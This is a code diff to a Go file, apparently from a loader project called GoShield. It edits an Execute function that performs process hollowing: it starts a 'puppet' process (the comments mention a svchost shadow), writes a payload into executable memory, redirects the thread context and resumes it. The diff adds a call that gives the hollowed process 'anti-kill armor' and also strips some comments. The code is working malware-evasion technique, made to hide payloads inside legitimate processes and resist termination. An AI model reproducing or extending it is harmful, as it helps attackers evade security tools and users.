@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"syscall"
 	"unsafe"
+
+	"github.com/Limkon/GoShield/internal/protect" // 🌟 修复：必须引入 protect 包
 )
 
 const (
@@ -48,6 +50,9 @@ func Execute(targetPath string, payload []byte) error {
 		return fmt.Errorf("CreateProcess failed: %v", err)
 	}
 
+	// 🌟🌟🌟 核心遗漏修复：必须为刚刚创建出来的傀儡进程（无论是业务程序还是 svchost 影子）强行注入防杀护甲！
+	protect.ProtectProcessByHandle(pi.Process)
+
 	// 3. 获取进程的 PEB (进程环境块)
 	var pbi PROCESS_BASIC_INFORMATION
 	var returnLength uint32
@@ -85,7 +90,6 @@ func Execute(targetPath string, payload []byte) error {
 		uintptr(PAGE_EXECUTE_READWRITE),
 	)
 	if allocAddress == 0 {
-		// 如果申请固定基址失败，则让系统任意分配，但需要处理重定位表 (为保持代码精简，这里假设未开启 ASLR 或固定分配成功)
 		return fmt.Errorf("VirtualAllocEx failed")
 	}
 
@@ -118,7 +122,6 @@ func Execute(targetPath string, payload []byte) error {
 	// 9. 获取傀儡线程上下文
 	var ctx CONTEXT64
 	ctx.ContextFlags = CONTEXT_FULL
-	// 针对 64 位要求，必须确保 ctx 变量是 16 字节对齐的。这里使用一个小 trick，强转避免对齐报错
 	alignCtx := (*CONTEXT64)(unsafe.Pointer((uintptr(unsafe.Pointer(&ctx)) + 15) &^ 15))
 	alignCtx.ContextFlags = CONTEXT_FULL
 
@@ -140,7 +143,7 @@ func Execute(targetPath string, payload []byte) error {
 	procSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(alignCtx)))
 	procResumeThread.Call(uintptr(pi.Thread))
 
-	// 🌟 12. 阻塞等待：等待傀儡进程（真实程序）运行结束。0xFFFFFFFF 代表 INFINITE（无限等待）
+	// 12. 阻塞等待：等待傀儡进程（真实程序）运行结束。0xFFFFFFFF 代表 INFINITE（无限等待）
 	procWaitForSingleObject.Call(uintptr(pi.Process), 0xFFFFFFFF)
 
 	return nil
